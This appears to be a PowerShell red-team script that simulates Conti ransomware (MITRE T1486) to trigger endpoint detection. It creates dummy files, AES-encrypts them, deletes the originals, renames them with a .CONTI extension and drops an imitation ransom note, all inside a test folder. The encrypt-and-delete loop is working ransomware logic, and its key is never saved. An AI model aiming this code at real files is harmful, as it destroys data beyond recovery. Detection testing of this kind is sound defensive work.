<#
.SYNOPSIS
    Conti Fast Encryption Simulation - DETECTION TRIGGER
.DESCRIPTION
    Simulates multi-threaded file encryption (Conti-style).
    TTP: T1486
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Conti Encryption Simulation (T1486)" -ForegroundColor Cyan
Write-Host "[!] This creates and encrypts TEST files only - NO real user data affected" -ForegroundColor Yellow

# Step 1: Create test directory with many files (simulating mass encryption)
$testDir = "C:\temp\conti_encrypt_test"
if (-not (Test-Path $testDir)) { New-Item -Path $testDir -ItemType Directory -Force | Out-Null }

Write-Host "`n[*] Creating batch of test files..."
$extensions = @(".docx", ".xlsx", ".pdf", ".txt", ".pptx", ".jpg", ".png", ".sql", ".bak", ".vmdk")
for ($i = 1; $i -le 10; $i++) {
    $ext = $extensions[($i - 1) % $extensions.Count]
    $filepath = "$testDir\document_$i$ext"
    "RTL Conti Test - File $i - $(Get-Date)" | Out-File $filepath -Encoding UTF8
    Write-Host "    [+] Created: document_$i$ext" -ForegroundColor Green
}

# Step 2: Rapid file encryption (simulating Conti's speed)
Write-Host "`n[*] [T1486] Executing rapid file encryption..."
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()

$files = Get-ChildItem $testDir -File | Where-Object { $_.Extension -ne ".CONTI" }
$encryptor = $aes.CreateEncryptor()
$startTime = Get-Date

foreach ($file in $files) {
    try {
        $plainBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
        $encPath = $file.FullName + ".CONTI"
        [System.IO.File]::WriteAllBytes($encPath, $encryptedBytes)
        Remove-Item $file.FullName -Force
        Write-Host "    [!] $($file.Name) -> $($file.Name).CONTI" -ForegroundColor Red
    } catch {
        Write-Host "    [-] Failed: $($file.Name)" -ForegroundColor Gray
    }
}

$elapsed = (Get-Date) - $startTime
Write-Host "    [+] Encrypted $($files.Count) files in $($elapsed.TotalMilliseconds)ms" -ForegroundColor Green

# Step 3: Drop ransom note (Conti-style)
$ransomNote = @"
All of your files are currently encrypted by CONTI ransomware.

[RTL TEST - Red Team Lab Simulation]

If you try to use any additional recovery software - the files might be
damaged, so if you are willing to try - try it on the data of the
least value.

Contact: conti-rtl-test@redteam.lab
"@
$ransomNote | Out-File "$testDir\readme.txt" -Encoding ASCII
Write-Host "    [+] Ransom note: $testDir\readme.txt" -ForegroundColor Green

$aes.Dispose()

Write-Host "`n[+] Conti Encryption Simulation Complete ($($files.Count) files)." -ForegroundColor Green
Write-Host "[!] Check EDR for: Rapid mass file encryption, .CONTI extension, ransom note creation" -ForegroundColor Magenta
